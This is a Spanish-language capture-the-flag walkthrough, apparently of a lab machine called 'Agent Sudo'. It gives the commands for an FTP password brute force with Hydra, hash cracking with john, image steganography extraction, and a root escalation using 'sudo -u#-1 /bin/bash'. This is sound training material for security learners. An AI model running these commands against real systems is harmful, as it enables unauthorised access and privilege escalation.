# Agent Sudo

## Nmap

![alt text](image.png)

## Web

![alt text](image-1.png)

Cambiamos el user agent a R

![alt text](image-2.png)

Cambiamos el user agent a C

![alt text](image-4.png)

## Fuzzing

![alt text](image-3.png)

## FTP

    hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.157.179

![alt text](image-5.png)

Podemos descargar todos los archivos usando ``mget *``

![alt text](image-6.png)

![alt text](image-7.png)

## Steg

    exiftool cutie.png

Podemos ver un Warning ``Trailer data after PNG IEND chunk``

![alt text](image-8.png)

![alt text](image-9.png)

Extraemos el zip de la imagen

    binwalk cutie.png -e

![alt text](image-10.png)

El archivo zip tiene contraseña, le pasamos ``JhonTheRipper``

    zip2john 8702.zip > zip.hashes

    john zip.hashes

![alt text](image-11.png)

Descomprimimos el zip

    7z e 8702.zip

![alt text](image-12.png)

Pasamos el mensaje oculto por ``CyberChef``

![alt text](image-13.png)

Extraemos el mensaje de la otra imagen

![alt text](image-14.png)

![alt text](image-15.png)

## SSH

![alt text](image-16.png)

Descargamos la imagen

    sudo scp james@10.10.157.179:Alien_autospy.jpg ~/

![alt text](image-17.png)

Buscamos la imagen en google. El nombre del incidente es ``Roswell alien autopsy``

## Escalada de Privilegios

![alt text](image-18.png)

Buscamos en google los permisos y encontramos como escalar

    sudo -u#-1 /bin/bash

![alt text](image-19.png)

![alt text](image-20.png)

